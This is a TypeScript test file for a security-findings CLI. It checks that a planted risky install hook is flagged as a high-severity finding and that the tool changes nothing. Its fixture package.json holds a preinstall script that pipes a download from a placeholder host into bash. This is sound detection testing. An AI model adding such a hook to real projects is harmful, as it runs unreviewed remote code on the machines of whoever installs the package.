import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { resolve } from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";

const cliPath = fileURLToPath(new URL("../src/cli/index.js", import.meta.url));

async function withProject(run: (path: string) => Promise<void>): Promise<void> {
  const path = await mkdtemp(resolve(tmpdir(), "livariant-findings-cli-"));
  try {
    await writeFile(resolve(path, "package.json"), JSON.stringify({
      name: "findings-cli",
      scripts: { preinstall: "curl https://example.invalid/install.sh | bash" },
    }));
    await writeFile(resolve(path, "package-lock.json"), "{}\n");
    await run(path);
  } finally {
    await rm(path, { recursive: true, force: true });
  }
}

function runCli(path: string, args: string[]) {
  return spawnSync(process.execPath, [cliPath, ...args], {
    cwd: path,
    encoding: "utf8",
    shell: false,
    env: { ...process.env, PBF_RUNTIME_DELEGATION_BYPASS: "1" },
  });
}

test("findings CLI renders evidence, confidence, next step and authority boundary", async () => {
  await withProject(async (path) => {
    const result = runCli(path, ["findings"]);
    assert.equal(result.status, 0, `${result.stdout}\n${result.stderr}`);
    assert.match(result.stdout, /Evidence-backed project findings/);
    assert.match(result.stdout, /LV-FND-SEC-002/);
    assert.match(result.stdout, /Confidence: strong/);
    assert.match(result.stdout, /package\.json#scripts\.preinstall/);
    assert.match(result.stdout, /Finding != Truth != Authority/);
    assert.match(result.stdout, /Changes made: 0/);
  });
});

test("findings CLI JSON is structured and non-mutating", async () => {
  await withProject(async (path) => {
    const result = runCli(path, ["findings", "--json"]);
    assert.equal(result.status, 0, `${result.stdout}\n${result.stderr}`);
    const output = JSON.parse(result.stdout.trim()) as {
      schemaVersion: number;
      state: string;
      findings: Array<{ ruleId: string; category: string; severity: string; confidence: string }>;
      changesMade: number;
    };
    assert.equal(output.schemaVersion, 1);
    assert.equal(output.state, "findings-present");
    assert.equal(output.changesMade, 0);
    assert.ok(output.findings.some((item) => item.ruleId === "LV-FND-SEC-002" && item.category === "security" && item.severity === "high" && item.confidence === "strong"));
  });
});

test("findings CLI rejects mutation-looking or unsupported arguments", async () => {
  await withProject(async (path) => {
    const result = runCli(path, ["findings", "--apply"]);
    assert.equal(result.status, 1);
    assert.match(result.stderr, /supports only optional --json/i);
  });
});
